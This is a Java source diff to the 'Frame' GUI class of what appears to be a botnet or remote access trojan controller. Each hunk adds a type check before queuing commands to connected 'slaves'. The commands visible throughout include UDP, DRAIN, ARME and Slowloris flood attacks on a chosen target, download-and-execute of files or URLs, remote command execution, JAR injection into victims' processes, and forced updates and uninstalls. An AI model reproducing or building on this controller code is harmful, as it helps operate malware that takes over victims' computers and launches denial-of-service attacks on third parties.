@@ -223,7 +223,9 @@ public class Frame extends BaseFrame {
 					for (int i = 0; i < Main.connections.size(); i++) {
 						AbstractSlave sl = Main.connections.get(i);
 						if (sl.getThumbnail() == null) {
-							sl.addToSendQueue(new Packet40Thumbnail());
+							if (sl instanceof Slave) {
+								((Slave)sl).addToSendQueue(new Packet40Thumbnail());
+							}
 						} else {
 							int row = Utils.getRow(sl);
 							mainModel.setValueAt(sl.getThumbnail(), row, 0);
@@ -614,11 +616,13 @@ public class Frame extends BaseFrame {
 				List<AbstractSlave> list = Utils.getSlaves();
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm restarting all connections")) {
-						for (AbstractSlave sl : list) {
-							try {
-								sl.addToSendQueue(new Packet37RestartJavaProcess());
-							} catch (Exception ex) {
-								ex.printStackTrace();
+						for (AbstractSlave sl : list) {							
+							if (sl instanceof Slave) {
+								try {
+									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
+								} catch (Exception ex) {
+									ex.printStackTrace();
+								}
 							}
 						}
 					}
@@ -636,11 +640,13 @@ public class Frame extends BaseFrame {
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm disconnecting all connections")) {
 						for (AbstractSlave sl : list) {
-							try {
-								sl.addToSendQueue(new Packet11Disconnect());
-							} catch (Exception ex) {
-								ex.printStackTrace();
-							}
+							if (sl instanceof Slave) {
+								try {
+									((Slave)sl).addToSendQueue(new Packet11Disconnect());
+								} catch (Exception ex) {
+									ex.printStackTrace();
+								}
+							}					
 						}
 					}
 				}
@@ -655,10 +661,12 @@ public class Frame extends BaseFrame {
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm reconnecting all connections")) {
 						for (AbstractSlave sl : list) {
-							try {
-								sl.addToSendQueue(new Packet45Reconnect());
-							} catch (Exception ex) {
-								ex.printStackTrace();
+							if (sl instanceof Slave) {
+								try {
+									((Slave)sl).addToSendQueue(new Packet45Reconnect());
+								} catch (Exception ex) {
+									ex.printStackTrace();
+								}
 							}
 						}
 					}
@@ -678,11 +686,13 @@ public class Frame extends BaseFrame {
 				if (list.size() > 0) {
 					if (Utils.yesNo("Confirm", "Confirm uninstalling all connections")) {
 						for (AbstractSlave sl : list) {
-							try {
-								sl.addToSendQueue(new Packet36Uninstall());
-							} catch (Exception ex) {
-								ex.printStackTrace();
-							}
+							if (sl instanceof Slave) {
+								try {
+									((Slave)sl).addToSendQueue(new Packet36Uninstall());
+								} catch (Exception ex) {
+									ex.printStackTrace();
+								}
+							}				
 						}
 					}
 				}
@@ -714,7 +724,9 @@ public class Frame extends BaseFrame {
 					AbstractSlave sl = Utils.getSlave(mainModel.getValueAt(i, 3).toString());
 					if (sl != null) {
 						if (!sl.getVersion().equals(Version.getVersion())) {
-							sl.addToSendQueue(new Packet18Update(result));
+							if (sl instanceof Slave) { 
+								((Slave)sl).addToSendQueue(new Packet18Update(result));
+							}
 							++servers;
 						}
 					}
@@ -783,7 +795,9 @@ public class Frame extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				for (int i = 0; i < Main.connections.size(); i++) {
 					AbstractSlave sl = Main.connections.get(i);
-					sl.addToSendQueue(new Packet40Thumbnail());
+					if (sl instanceof Slave) {
+						((Slave)sl).addToSendQueue(new Packet40Thumbnail());
+					}
 				}
 			}
 		});
@@ -1028,7 +1042,9 @@ public class Frame extends BaseFrame {
 				List<AbstractSlave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (AbstractSlave sl : servers) {
-						sl.addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
+						}
 					}
 				}
 			}
@@ -1058,7 +1074,9 @@ public class Frame extends BaseFrame {
 				List<AbstractSlave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (AbstractSlave sl : servers) {
-						sl.addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
+						}
 					}
 				}
 			}
@@ -1094,7 +1112,9 @@ public class Frame extends BaseFrame {
 				List<AbstractSlave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (AbstractSlave sl : servers) {
-						sl.addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
+						}
 					}
 				}
 			}
@@ -1129,7 +1149,9 @@ public class Frame extends BaseFrame {
 				List<AbstractSlave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (AbstractSlave sl : servers) {
-						sl.addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
+						}
 					}
 				}
 			}
@@ -1158,7 +1180,9 @@ public class Frame extends BaseFrame {
 					}
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet17DownloadExecute("", Downloadable.getFileExtension(file.getName()), file));
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet17DownloadExecute("", Downloadable.getFileExtension(file.getName()), file));
+						}
 					}
 				}
 			}
@@ -1187,7 +1211,10 @@ public class Frame extends BaseFrame {
 					}
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet18Update(file));
+						
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet18Update(file));
+						}
 					}
 				}
 			}
@@ -1225,7 +1252,9 @@ public class Frame extends BaseFrame {
 					result = result.trim().replace(" ", "%20");
 
 					for (AbstractSlave sl : servers) {
-						sl.addToSendQueue(new Packet18Update(result));
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet18Update(result));
+						}
 					}
 				}
 			}
@@ -1255,7 +1284,9 @@ public class Frame extends BaseFrame {
 					}
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet17DownloadExecute(result, filetype));
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet17DownloadExecute(result, filetype));
+						}
 					}
 				}
 			}
@@ -1297,7 +1328,9 @@ public class Frame extends BaseFrame {
 					result = result.trim();
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet14VisitURL(result));
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet14VisitURL(result));
+						}
 					}
 				}
 
@@ -1397,7 +1430,9 @@ public class Frame extends BaseFrame {
 					}
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet38RunCommand(process));
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
+						}
 					}
 				}
 			}
@@ -1431,7 +1466,9 @@ public class Frame extends BaseFrame {
 					}
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet98InjectJAR(url, mainClass));
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet98InjectJAR(url, mainClass));
+						}
 					}
 				}
 			}
@@ -1462,7 +1499,9 @@ public class Frame extends BaseFrame {
 					}
 
 					for (AbstractSlave slave : servers) {
-						slave.addToSendQueue(new Packet98InjectJAR(file, mainClass));
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet98InjectJAR(file, mainClass));
+						}
 					}
 				}
 			}
@@ -1492,7 +1531,9 @@ public class Frame extends BaseFrame {
 					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " connections")) {
 						for (AbstractSlave sl : servers) {
 							try {
-								sl.addToSendQueue(new Packet11Disconnect());
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet11Disconnect());
+								}
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -1510,7 +1551,9 @@ public class Frame extends BaseFrame {
 					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " connections")) {
 						for (AbstractSlave sl : servers) {
 							try {
-								sl.addToSendQueue(new Packet37RestartJavaProcess());
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
+								}
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -1544,7 +1587,9 @@ public class Frame extends BaseFrame {
 					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " connections")) {
 						for (AbstractSlave sl : servers) {
 							try {
-								sl.addToSendQueue(new Packet45Reconnect());
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet45Reconnect());
+								}
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -1566,7 +1611,9 @@ public class Frame extends BaseFrame {
 					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " connections")) {
 						for (AbstractSlave sl : servers) {
 							try {
-								sl.addToSendQueue(new Packet36Uninstall());
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet36Uninstall());
+								}
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
